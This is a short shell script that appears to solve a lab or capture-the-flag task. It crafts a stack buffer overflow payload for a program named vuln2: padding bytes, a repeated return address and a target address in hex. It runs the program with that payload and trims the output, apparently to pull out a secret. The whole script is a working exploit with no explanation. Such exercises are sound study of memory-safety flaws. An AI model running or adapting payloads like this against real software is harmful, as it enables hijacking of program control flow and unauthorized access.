#!/bin/sh
export ManyA=$(python -c 'print "a"*1024')
export RetAdd=$(python -c 'print "\xa0\xed\xff\xbf" * 7')
export TarAdd=$(python -c 'print "\x0b\x85\x04\x08"')
script -q -c '/home/task2/vuln2 $ManyA$RetAdd$TarAdd' |
 tail -1 |
 rev |
 cut -c 2- |
 rev |
 cut -c 29- |
 tr -d "\n" 
unset ManyA
unset RetAdd
unset TarAdd
